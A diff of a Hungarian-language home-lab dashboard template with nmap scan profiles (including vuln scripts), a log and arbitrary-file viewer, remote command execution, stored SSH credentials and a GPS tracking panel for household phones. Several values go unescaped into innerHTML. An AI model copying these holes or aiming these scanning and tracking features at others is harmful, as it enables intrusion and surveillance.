+          style="background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;">
+          <option value="fast">🚀 Gyors (-F)</option>
+          <option value="top1000">📋 Top 1000</option>
+          <option value="service">🔍 Szolgáltatás (-sV)</option>
+          <option value="os">💻 OS detekció (-O)</option>
+          <option value="aggressive">🔥 Agresszív (-A)</option>
+          <option value="full">💀 Teljes (-p-)</option>
+          <option value="ping">📡 Ping sweep</option>
+          <option value="udp">📶 UDP top 200</option>
+          <option value="vuln">🛡 Vuln script</option>
+        </select>
+
+        <button id="scan-start-btn" onclick="startScan()"
+          style="background:var(--red);border:none;color:#fff;border-radius:5px;padding:3px 14px;cursor:pointer;font-size:.82rem;font-weight:600;">▶ Scan</button>
+        <button id="scan-stop-btn" onclick="stopScan()" style="display:none;background:transparent;border:1px solid var(--orange);color:var(--orange);border-radius:5px;padding:3px 12px;cursor:pointer;font-size:.82rem;">⏹ Stop</button>
+        <span id="scan-status" style="font-size:.72rem;color:var(--muted);">—</span>
+        <button type="button" class="btn-close btn-close-white ms-auto" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body p-0">
+        <pre id="scan-output"
+          style="background:#000;color:#c9d1d9;margin:0;padding:10px 14px;font-size:.75rem;font-family:Consolas,Monaco,monospace;height:480px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.6;">Adj meg egy célt és nyomj Scan-t...</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Log néző modal -->
+<div class="modal fade" id="logModal" tabindex="-1">
+  <div class="modal-dialog modal-xl modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header" style="flex-wrap:wrap;gap:8px;">
+        <h6 class="modal-title">📄 Log néző</h6>
+        <select id="log-machine" onchange="loadLog()"
+          style="background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;">
+          {% for mid, m in machines.items() %}
+          <option value="{{mid}}">{{m.label}}</option>
+          {% endfor %}
+        </select>
+        <select id="log-file" onchange="loadLog()"
+          style="background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;max-width:200px;">
+          <option value="journalctl">journalctl (system)</option>
+          <option value="/var/log/syslog">syslog</option>
+          <option value="/var/log/auth.log">auth.log</option>
+          <option value="/var/log/kern.log">kern.log</option>
+          <option value="/var/log/dpkg.log">dpkg.log</option>
+          <option value="/var/log/apache2/access.log">apache2/access</option>
+          <option value="/var/log/apache2/error.log">apache2/error</option>
+          <option value="/var/log/fail2ban.log">fail2ban.log</option>
+          <option value="/tmp/retro-radio.log">retro-radio.log</option>
+          <option value="/tmp/dashboard.log">dashboard.log</option>
+          <option value="custom">— egyéni útvonal —</option>
+        </select>
+        <input id="log-custom" type="text" placeholder="/path/to/file.log"
+          style="display:none;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;width:180px;"
+          onchange="loadLog()">
+        <select id="log-lines" onchange="loadLog()"
+          style="background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 6px;font-family:inherit;font-size:.78rem;">
+          <option value="50">50 sor</option>
+          <option value="100" selected>100 sor</option>
+          <option value="200">200 sor</option>
+          <option value="500">500 sor</option>
+        </select>
+        <input id="log-search" type="text" placeholder="🔍 kiemel..."
+          style="background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;width:120px;"
+          oninput="highlightLog()">
+        <button onclick="loadLog()" style="background:transparent;border:1px solid var(--yellow);color:var(--yellow);border-radius:4px;padding:2px 9px;cursor:pointer;font-size:.75rem;">↺</button>
+        <label style="font-size:.72rem;color:var(--muted);cursor:pointer;display:flex;align-items:center;gap:4px;white-space:nowrap;">
+          <input type="checkbox" id="log-auto" onchange="toggleLogAuto()"> Auto (5s)
+        </label>
+        <button type="button" class="btn-close btn-close-white ms-auto" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body p-0">
+        <pre id="log-output"
+          style="background:#000;color:#c9d1d9;margin:0;padding:10px 14px;font-size:.72rem;font-family:Consolas,Monaco,monospace;height:480px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5;">Válassz log fájlt...</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Folyamatkezelő modal -->
+<div class="modal fade" id="procModal" tabindex="-1">
+  <div class="modal-dialog modal-xl modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header" style="gap:10px;">
+        <h6 class="modal-title">📋 Folyamatok — <span id="proc-label" style="color:var(--blue)">—</span></h6>
+        <input id="proc-search" type="text" placeholder="🔍 szűrő..."
+          style="background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:2px 8px;font-family:inherit;font-size:.75rem;width:140px;"
+          oninput="filterProcs()">
+        <button onclick="loadProcs()" style="background:transparent;border:1px solid var(--blue);color:var(--blue);border-radius:4px;padding:1px 9px;cursor:pointer;font-size:.75rem;">↺</button>
+        <label style="font-size:.72rem;color:var(--muted);cursor:pointer;display:flex;align-items:center;gap:4px;white-space:nowrap;">
+          <input type="checkbox" id="proc-auto" onchange="toggleProcAuto()"> Auto (5s)
+        </label>
+        <span id="proc-count" style="font-size:.7rem;color:var(--muted);white-space:nowrap;">—</span>
+        <button type="button" class="btn-close btn-close-white ms-auto" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body p-0" style="max-height:520px;overflow-y:auto;">
+        <table style="width:100%;border-collapse:collapse;font-size:.75rem;font-family:Consolas,Monaco,monospace;">
+          <thead style="position:sticky;top:0;background:var(--header);z-index:1;">
+            <tr>
+              <th style="padding:6px 10px;color:var(--muted);font-weight:normal;cursor:pointer;" onclick="sortProcs('pid')">PID ↕</th>
+              <th style="padding:6px 6px;color:var(--muted);font-weight:normal;">User</th>
+              <th style="padding:6px 6px;color:var(--muted);font-weight:normal;cursor:pointer;" onclick="sortProcs('cpu')">CPU% ↕</th>
+              <th style="padding:6px 6px;color:var(--muted);font-weight:normal;cursor:pointer;" onclick="sortProcs('mem')">RAM% ↕</th>
+              <th style="padding:6px 6px;color:var(--muted);font-weight:normal;">Állapot</th>
+              <th style="padding:6px 6px;color:var(--muted);font-weight:normal;">Név</th>
+              <th style="padding:6px 6px;color:var(--muted);font-weight:normal;">Parancs</th>
+              <th style="padding:6px 10px;color:var(--muted);font-weight:normal;"></th>
+            </tr>
+          </thead>
+          <tbody id="proc-tbody"></tbody>
+        </table>
+        <div id="proc-empty" style="text-align:center;padding:30px;color:var(--muted);display:none;">Nincs adat</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Screenshot modal -->
+<div class="modal fade" id="ssModal" tabindex="-1">
+  <div class="modal-dialog modal-xl modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h6 class="modal-title"><i class="fas fa-desktop me-2" style="color:var(--purple)"></i><span id="ss-title">Képernyő előnézet</span></h6>
+        <div class="d-flex align-items-center gap-2 ms-3">
+          <span id="ss-time" style="font-size:.72rem;color:var(--muted);">—</span>
+          <button onclick="takeScreenshot()" id="ss-refresh-btn"
+            style="background:transparent;border:1px solid var(--purple);color:var(--purple);border-radius:4px;padding:1px 9px;cursor:pointer;font-size:.75rem;">
+            ↺ Frissít
+          </button>
+          <label style="font-size:.72rem;color:var(--muted);cursor:pointer;display:flex;align-items:center;gap:4px;">
+            <input type="checkbox" id="ss-auto" onchange="toggleAutoSS()"> Auto (5s)
+          </label>
+        </div>
+        <button type="button" class="btn-close btn-close-white ms-auto" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body" style="background:#000;padding:8px;text-align:center;min-height:200px;display:flex;align-items:center;justify-content:center;">
+        <div id="ss-loading" style="color:var(--muted);font-size:.9rem;">⏳ Screenshot készítése...</div>
+        <img id="ss-img" src="" alt="Screenshot" style="max-width:100%;max-height:70vh;display:none;border-radius:4px;">
+        <div id="ss-error" style="color:var(--red);font-size:.85rem;display:none;"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Gyorsparancsok modal -->
+<div class="modal fade" id="cmdModal" tabindex="-1">
+  <div class="modal-dialog modal-xl modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h6 class="modal-title">⚡ Gyorsparancsok</h6>
+        <button type="button" class="btn-close btn-close-white ms-auto" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body" style="display:grid;grid-template-columns:220px 1fr;gap:12px;padding:12px;">
+        <!-- Bal panel: gép + parancsok -->
+        <div>
+          <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;">Célgép</div>
+          <select id="cmd-machine" style="width:100%;background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:5px 8px;font-family:inherit;font-size:.82rem;margin-bottom:12px;">
+            {% for mid, m in machines.items() %}
+            <option value="{{mid}}">{{m.label}}</option>
+            {% endfor %}
+          </select>
+
+          <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;">Gyorsparancsok</div>
+          <div style="display:flex;flex-direction:column;gap:5px;" id="cmd-btns"></div>
+
+          <div style="margin-top:14px;font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;">Egyéni parancs</div>
+          <div style="display:flex;gap:6px;">
+            <input id="cmd-custom" type="text" placeholder="pl. uname -a"
+              style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:5px 8px;font-family:inherit;font-size:.82rem;"
+              onkeydown="if(event.key==='Enter') runCmd(document.getElementById('cmd-custom').value)">
+            <button onclick="runCmd(document.getElementById('cmd-custom').value)"
+              style="background:var(--green);border:none;color:#000;border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.82rem;font-weight:600;">▶</button>
+          </div>
+
+          <button onclick="clearCmdOutput()" style="margin-top:8px;width:100%;background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:4px;cursor:pointer;font-size:.75rem;">🗑 Törlés</button>
+        </div>
+
+        <!-- Jobb panel: kimenet -->
+        <div style="display:flex;flex-direction:column;">
+          <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;">
+            Kimenet — <span id="cmd-run-label" style="color:var(--blue)">—</span>
+          </div>
+          <pre id="cmd-output" style="flex:1;background:#000;color:#c9d1d9;border-radius:6px;padding:10px;font-size:.78rem;font-family:Consolas,Monaco,monospace;overflow-y:auto;height:420px;margin:0;white-space:pre-wrap;word-break:break-all;">Válassz parancsot...</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Hálózati térkép modal -->
+<div class="modal fade" id="netModal" tabindex="-1">
+  <div class="modal-dialog modal-xl modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h6 class="modal-title">🗺️ Hálózati térkép</h6>
+        <div class="d-flex align-items-center gap-2 ms-3">
+          <span id="net-scan-status" style="font-size:.72rem;color:var(--muted)">—</span>
+          <button onclick="loadNetMap()" style="background:transparent;border:1px solid var(--blue);color:var(--blue);border-radius:4px;padding:1px 8px;cursor:pointer;font-size:.75rem;">↺ Frissít</button>
+        </div>
+        <button type="button" class="btn-close btn-close-white ms-auto" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body p-0" style="height:520px;background:var(--bg);">
+        <div id="net-map" style="width:100%;height:100%;"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Nyomtató modal -->
+<div class="modal fade" id="printerModal" tabindex="-1">
+  <div class="modal-dialog modal-lg modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h6 class="modal-title" style="color:var(--orange);">🖨️ Nyomtató — HP LaserJet Pro MFP M26nw</h6>
+        <button onclick="loadPrinterStatus()" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:1px 9px;cursor:pointer;font-size:.75rem;">↺</button>
+        <button type="button" class="btn-close btn-close-white ms-auto" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body" style="display:grid;grid-template-columns:1fr 1fr;gap:16px;padding:16px;">
+        <!-- Bal panel: státusz -->
+        <div>
+          <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;">Állapot</div>
+
+          <div style="background:var(--header);border-radius:8px;padding:12px;margin-bottom:10px;">
+            <div class="d-flex justify-content-between align-items-center mb-2">
+              <span style="font-size:.72rem;color:var(--muted);">TONER SZINT</span>
+              <span id="pm-toner-pct" style="font-weight:700;color:var(--green);">—%</span>
+            </div>
+            <div class="toner-bar">
+              <div class="toner-fill toner-ok" id="pm-toner-bar" style="width:0%"></div>
+            </div>
+            <div id="pm-toner-name" style="font-size:.65rem;color:var(--muted);margin-top:5px;">—</div>
+          </div>
+
+          <div style="background:var(--header);border-radius:8px;padding:12px;margin-bottom:10px;">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:.72rem;">
+              <div>
+                <div style="color:var(--muted);margin-bottom:2px;">IP CÍM</div>
+                <div id="pm-ip" style="color:var(--blue);">—</div>
+              </div>
+              <div>
+                <div style="color:var(--muted);margin-bottom:2px;">ELÉRHETŐSÉG</div>
+                <div id="pm-online" style="color:var(--green);">—</div>
+              </div>
+              <div>
+                <div style="color:var(--muted);margin-bottom:2px;">ÁLLAPOT</div>
+                <div id="pm-status" style="color:var(--text);">—</div>
+              </div>
+              <div>
+                <div style="color:var(--muted);margin-bottom:2px;">FELADATOK</div>
+                <div id="pm-jobs-count" style="color:var(--text);">0 db</div>
+              </div>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;">Nyomtatási sor</div>
+            <div id="pm-job-list"
+              style="font-size:.72rem;background:var(--header);border-radius:6px;min-height:60px;max-height:150px;overflow-y:auto;padding:8px;">
+              <div style="color:var(--muted);text-align:center;padding:12px;">Nincs feladat</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Jobb panel: nyomtatás -->
+        <div>
+          <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;">Nyomtatás</div>
+
+          <div id="pm-dropzone"
+            style="border:2px dashed var(--border);border-radius:8px;padding:20px;text-align:center;cursor:pointer;transition:.2s;margin-bottom:10px;"
+            onclick="document.getElementById('pm-file').click()"
+            ondragover="event.preventDefault();this.style.borderColor='var(--orange)'"
+            ondragleave="this.style.borderColor='var(--border)'"
+            ondrop="handlePrinterDrop(event)">
+            <div style="font-size:1.8rem;margin-bottom:6px;">📄</div>
+            <div style="font-size:.78rem;color:var(--muted);">Húzz ide fájlt vagy kattints</div>
+            <div style="font-size:.65rem;color:var(--muted);margin-top:3px;">PDF · DOC · TXT · JPG · PNG</div>
+          </div>
+          <input type="file" id="pm-file" accept=".pdf,.doc,.docx,.txt,.jpg,.jpeg,.png,.odt" style="display:none" onchange="handlePrinterFile(this)">
+
+          <div id="pm-file-info" style="display:none;background:var(--header);border-radius:6px;padding:8px 10px;font-size:.72rem;margin-bottom:10px;color:var(--text);">
+            📄 <span id="pm-file-name">—</span>
+            <button onclick="clearPrinterFile()" style="float:right;background:transparent;border:none;color:var(--red);cursor:pointer;font-size:.8rem;">✕</button>
+          </div>
+
+          <div style="background:var(--header);border-radius:8px;padding:12px;margin-bottom:10px;">
+            <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;">Beállítások</div>
+            <div class="d-flex gap-3 align-items-center flex-wrap">
+              <div>
+                <label style="font-size:.68rem;color:var(--muted);display:block;margin-bottom:3px;">PÉLDÁNYSZÁM</label>
+                <input type="number" id="pm-copies" value="1" min="1" max="99"
+                  style="width:64px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 6px;font-family:inherit;font-size:.82rem;text-align:center;">
+              </div>
+              <div style="display:flex;align-items:center;gap:8px;margin-top:14px;">
+                <input type="checkbox" id="pm-duplex" style="accent-color:var(--orange);">
+                <label for="pm-duplex" style="font-size:.75rem;color:var(--text);cursor:pointer;">Kétoldalas</label>
+              </div>
+            </div>
+          </div>
+
+          <button id="pm-print-btn" onclick="submitPrint()"
+            style="width:100%;background:var(--orange);border:none;color:#000;border-radius:8px;padding:9px;cursor:pointer;font-size:.85rem;font-weight:700;transition:.15s;">
+            <i class="fas fa-print me-2"></i>Nyomtatás indítása
+          </button>
+
+          <div id="pm-print-status" style="margin-top:8px;font-size:.72rem;text-align:center;color:var(--muted);min-height:16px;"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/vis-network@9.1.9/dist/vis-network.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+<script>
+// ── Shadow Lab: Machine management ───────────────────────────────────────────
+function openAddMachine() {
+  document.getElementById('am-label').value = '';
+  document.getElementById('am-host').value = '';
+  document.getElementById('am-user').value = '';
+  document.getElementById('am-pass').value = '';
+  document.getElementById('am-mac').value = '';
+  document.getElementById('am-local').checked = false;
+  document.getElementById('add-machine-err').style.display = 'none';
+  new bootstrap.Modal(document.getElementById('addMachineModal')).show();
+}
+
+async function submitAddMachine() {
+  const label = document.getElementById('am-label').value.trim();
+  const host  = document.getElementById('am-host').value.trim();
+  const errEl = document.getElementById('add-machine-err');
+  if (!label || !host) {
+    errEl.textContent = 'Label and host are required.';
+    errEl.style.display = 'block';
+    return;
+  }
+  const res = await fetch('/api/machines', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      label, host,
+      ssh_user: document.getElementById('am-user').value.trim(),
+      ssh_pass: document.getElementById('am-pass').value,
+      mac:      document.getElementById('am-mac').value.trim(),
+      is_local: document.getElementById('am-local').checked,
+    })
+  });
+  const data = await res.json();
+  if (data.error) {
+    errEl.textContent = data.error;
+    errEl.style.display = 'block';
+    return;
+  }
+  bootstrap.Modal.getInstance(document.getElementById('addMachineModal')).hide();
+  location.reload();
+}
+
+async function openManageMachines() {
+  const res  = await fetch('/api/machines');
+  const data = await res.json();
+  const list = document.getElementById('manage-machine-list');
+  if (!data.machines || data.machines.length === 0) {
+    list.innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);">No machines yet. Add one!</div>';
+  } else {
+    list.innerHTML = data.machines.map(m => `
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 16px;border-bottom:1px solid var(--border);font-size:.8rem;">
+        <div>
+          <div style="font-weight:600;color:var(--text);">${m.label}</div>
+          <div style="color:var(--muted);font-size:.72rem;">${m.host}${m.local ? ' · local' : ''}</div>
+        </div>
+        <button onclick="deleteMachine(${m.id})"
+          style="background:transparent;border:1px solid var(--red);color:var(--red);border-radius:4px;padding:2px 10px;cursor:pointer;font-size:.72rem;">Delete</button>
+      </div>`).join('');
+  }
+  new bootstrap.Modal(document.getElementById('manageMachinesModal')).show();
+}
+
+async function deleteMachine(id) {
+  if (!confirm('Delete this machine?')) return;
+  await fetch('/api/machines/' + id, {method: 'DELETE'});
+  location.reload();
+}
+
+function showUpgrade() {
+  new bootstrap.Modal(document.getElementById('upgradeModal')).show();
+}
+
+// ── Utilities ────────────────────────────────────────────────────────────────
+const fmtBytes = b => {
+  if (b < 1024) return b+'B';
+  if (b < 1048576) return (b/1024).toFixed(1)+'KB';
+  if (b < 1073741824) return (b/1048576).toFixed(1)+'MB';
+  return (b/1073741824).toFixed(2)+'GB';
+};
+const fmtSpd = b => {
+  if (b < 1024) return b.toFixed(0)+' B/s';
+  if (b < 1048576) return (b/1024).toFixed(1)+' KB/s';
+  return (b/1048576).toFixed(1)+' MB/s';
+};
+const fmtUp = s => {
+  const d=Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60);
+  if(d>0) return `up ${d}d ${h}h`;
+  if(h>0) return `up ${h}h ${m}m`;
+  return `up ${m}m`;
+};
+const barCls = p => p<50?'pb-green':p<75?'pb-yellow':p<90?'pb-orange':'pb-red';
+const tempClr = t => t<50?'var(--green)':t<70?'var(--yellow)':t<85?'var(--orange)':'var(--red)';
+const el = id => document.getElementById(id);
+const setText = (id,v) => { const e=el(id); if(e) e.textContent=v; };
+const setW   = (id,p) => { const e=el(id); if(e) e.style.width=p+'%'; };
+const setCls = (id,c) => { const e=el(id); if(e) e.className='progress-bar '+c; };
+
+// ── Update a single machine card ─────────────────────────────────────────────
+function update(mid, data) {
+  const online = data.online !== false;
+  const ov     = el(`ov-${mid}`);
+  const dot    = el(`dot-${mid}`);
+  const badge  = el(`badge-${mid}`);
+
+  if (!online) {
+    if(ov) ov.style.display='flex';
+    if(dot)   { dot.className='dot dot-off'; }
+    if(badge) { badge.textContent='OFFLINE'; badge.className='badge-off'; }
+    return;
+  }
+  if(ov)    ov.style.display='none';
+  if(dot)   { dot.className='dot dot-on'; }
+  if(badge) { badge.textContent='ONLINE'; badge.className='badge-on'; }
+
+  // Honeypot kártya — egyedi megjelenítés
+  if (data.type === 'honeypot') {
+    const lat = el(`hp-lat-${mid}`);
+    if (lat) {
+      if (data.latency !== null && data.latency !== undefined) {
+        const ms = data.latency.toFixed(1);
+        const clr = data.latency < 10 ? 'var(--green)' : data.latency < 50 ? 'var(--yellow)' : 'var(--red)';
+        lat.textContent = ms + ' ms';
+        lat.style.color = clr;
+      } else {
+        lat.textContent = '— ms';
+      }
+    }
+    // DOROTHY alert lista
+    const total = el(`hp-total-${mid}`);
+    const list  = el(`hp-alert-list-${mid}`);
+    if (total) total.textContent = (data.dorothy_total_24h || 0).toString();
+    if (list && data.dorothy_alerts !== undefined) {
+      if (data.dorothy_alerts.length === 0) {
+        list.innerHTML = '<div style="font-size:.65rem;color:var(--muted);text-align:center;padding:6px 0;"><i class="fas fa-shield-check me-1"></i>Nincs kapcsolat</div>';
+      } else {
+        list.innerHTML = data.dorothy_alerts.map(a => {
+          const isExt = a.src && !a.src.startsWith('192.168.');
+          const icon = isExt ? '🌍' : '🏠';
+          const clr  = isExt ? 'var(--red)' : 'var(--orange)';
+          const t = a.ts ? a.ts.split(' ')[1] : '?';
+          return `<div style="display:flex;justify-content:space-between;align-items:center;background:var(--header);border-radius:4px;padding:3px 6px;font-size:.64rem;">
+            <span style="color:${clr};font-weight:600;">${icon} ${a.src||'?'}</span>
+            <span style="color:var(--muted);">:${a.dst_port||'?'} ${a.proto||''}</span>
+            <span style="color:var(--muted);">${t}</span>
+          </div>`;
+        }).join('');
+      }
+    }
+    return;
+  }
+
+  // Router kártya — egyedi megjelenítés
+  if (data.type === 'router') {
+    const lat = el(`rtr-lat-${mid}`);
+    if (lat) {
+      if (data.latency !== null && data.latency !== undefined) {
+        const ms = data.latency.toFixed(1);
+        const clr = data.latency < 5 ? 'var(--green)' : data.latency < 20 ? 'var(--yellow)' : 'var(--red)';
+        lat.textContent = ms + ' ms';
+        lat.style.color = clr;
+      } else {
+        lat.textContent = '— ms';
+      }
+    }
+    if (data.firmware) setText(`rtr-fw-${mid}`, data.firmware);
+    const warn = el(`rtr-warn-${mid}`);
+    if (warn) warn.style.display = data.no_password ? 'block' : 'none';
+    return;
+  }
+
+  setText(`hn-${mid}`, data.hostname||'—');
+  setText(`up-${mid}`, data.uptime ? fmtUp(data.uptime) : '—');
+
+  // CPU
+  const cpu = data.cpu||0;
+  setText(`cpu-v-${mid}`, cpu.toFixed(1)+'%');
+  setW(`cpu-b-${mid}`, cpu); setCls(`cpu-b-${mid}`, barCls(cpu));
+  if(data.load) setText(`load-${mid}`, 'load: '+data.load.map(l=>l.toFixed(2)).join(' '));
+
+  // RAM
+  if(data.ram) {
+    const r=data.ram;
+    setText(`ram-v-${mid}`, r.percent.toFixed(1)+'%');
+    setW(`ram-b-${mid}`, r.percent); setCls(`ram-b-${mid}`, barCls(r.percent));
+    setText(`ram-d-${mid}`, fmtBytes(r.used)+' / '+fmtBytes(r.total));
+  }
+
+  // Disk
+  if(data.disk) {
+    const d=data.disk;
+    setText(`disk-v-${mid}`, d.percent.toFixed(1)+'%');
+    setW(`disk-b-${mid}`, d.percent); setCls(`disk-b-${mid}`, barCls(d.percent));
+    setText(`disk-d-${mid}`, fmtBytes(d.used)+' / '+fmtBytes(d.total));
+  }
+
+  // Net rates
+  if(data.net_rate) {
+    setText(`nu-${mid}`, fmtSpd(data.net_rate.sent));
+    setText(`nd-${mid}`, fmtSpd(data.net_rate.recv));
+  }
+
+  // Temps
+  const te = el(`temp-${mid}`);
+  if(te && data.temps) {
+    const chips = [];
+    for(const [,readings] of Object.entries(data.temps)) {
+      for(const r of readings) {
+        const c=tempClr(r.current);
+        chips.push(`<span class="temp-chip" style="background:${c}22;border:1px solid ${c};color:${c}">${r.label}: ${r.current}°C</span>`);
+      }
+    }
+    te.innerHTML = chips.length ? chips.join('') : '<span style="font-size:.68rem;color:var(--muted)">N/A</span>';
+  }
+
+  // GPU
+  if(data.gpu) {
+    const gs=el(`gpu-s-${mid}`); if(gs) gs.style.display='block';
+    setText(`gpu-u-${mid}`, data.gpu.util);
+    setText(`gpu-t-${mid}`, data.gpu.temp);
+    setText(`gpu-m-${mid}`, fmtBytes(data.gpu.mem_used*1048576)+'/'+fmtBytes(data.gpu.mem_total*1048576));
+  }
+
+  // Grafikon
+  if (data.cpu !== undefined && data.ram) {
+    _updateChart(mid, data.cpu, data.ram.percent);
+  }
+
+  // Alertek
+  handleAlerts(mid, mid, data.alerts || []);
+}
+
+// ── Stats WebSocket ──────────────────────────────────────────────────────────
+let statsWs;
+function connectStats() {
+  const wb = el('ws-badge');
+  statsWs = new WebSocket(`ws://${location.host}/ws/stats`);
+  statsWs.onopen  = () => { wb.textContent='Live'; wb.style.background='var(--green)'; wb.style.color='#000'; };
+  statsWs.onclose = () => { wb.textContent='Disconnected'; wb.style.background='var(--red)'; wb.style.color='#fff'; setTimeout(connectStats,3000); };
+  statsWs.onerror = () => { wb.textContent='Error'; wb.style.background='var(--red)'; };
+  statsWs.onmessage = evt => {
+    const all = JSON.parse(evt.data);
+    if (all._new_device) { showDeviceAlert(all._new_device); return; }
+    for(const [mid,data] of Object.entries(all)) update(mid, data);
+    el('last-upd').textContent = new Date().toLocaleTimeString('hu-HU');
+  };
+}
+
+// ── Mobilok helymeghatározás ─────────────────────────────────────────────────
+function fetchMobiles() {
+  fetch('/api/mobiles').then(r => r.json()).then(devices => {
+    const body  = el('mobiles-body');
+    const badge = el('mobiles-badge');
+    const upd   = el('mobiles-last-upd');
+    if (!body || !Array.isArray(devices)) return;
+    const home = devices.filter(d => d.state === 'home').length;
+    const withGps = devices.filter(d => d.lat !== null).length;
+    badge.textContent = `${home}/${devices.length} otthon`;
+    badge.className = home === devices.length ? 'badge-on' : (home > 0 ? 'badge-warn' : 'badge-off');
+    upd.textContent = new Date().toLocaleTimeString('hu-HU');
+
+    const homeCount = devices.filter(d => d.at_home === true).length;
+    badge.textContent = `${homeCount}/${devices.length} otthon`;
+    badge.className = homeCount === devices.length ? 'badge-on' : (homeCount > 0 ? 'badge-warn' : 'badge-off');
+    body.innerHTML = devices.map(d => {
+      const isHome = d.at_home === true;
+      const hasGps = d.lat !== null && d.lat !== undefined;
+      const isUnavail = !hasGps;
+      const stateCol = isHome ? 'var(--green)' : isUnavail ? 'var(--muted)' : 'var(--red)';
+      const distLabel = hasGps ? (isHome ? `🏠 ${d.dist_home}m` : `🚶 ${d.dist_home}m`) : '—';
+      const stateLabel = isHome ? 'Otthon' : isUnavail ? '—' : 'Távol';
+      const addr = d.address || (d.lat ? `${d.lat.toFixed(4)}, ${d.lon.toFixed(4)}` : null);
+      const mapsUrl = d.lat ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : null;
+      const ts = d.last_updated
+        ? new Date(d.last_updated).toLocaleTimeString('hu-HU', {hour:'2-digit',minute:'2-digit'})
+        : (d.ts_last_seen ? new Date(d.ts_last_seen).toLocaleTimeString('hu-HU', {hour:'2-digit',minute:'2-digit'}) : '—');
+      return `<div style="display:flex;align-items:flex-start;gap:8px;padding:5px 0;border-bottom:1px solid var(--border);">
+        <i class="fas fa-mobile-alt" style="color:${stateCol};margin-top:2px;font-size:.85rem;width:14px;flex-shrink:0;"></i>
+        <div style="flex:1;min-width:0;">
+          <div style="display:flex;justify-content:space-between;align-items:center;">
+            <span style="font-size:.82rem;font-weight:600;color:var(--fg);">${d.label}</span>
+            <span style="font-size:.72rem;color:${stateCol};font-weight:700;">${distLabel}</span>
+          </div>
+          ${addr ? `<div style="font-size:.72rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:180px;">
+            ${mapsUrl ? `<a href="${mapsUrl}" target="_blank" style="color:var(--blue);text-decoration:none;">${addr}</a>` : addr}
+          </div>` : '<div style="font-size:.72rem;color:var(--muted);">GPS nem elérhető</div>'}
+          <div style="font-size:.68rem;color:var(--muted);">frissítve: ${ts}</div>
+        </div>
+      </div>`;
+    }).join('');
+  }).catch(() => {
+    const body = el('mobiles-body');
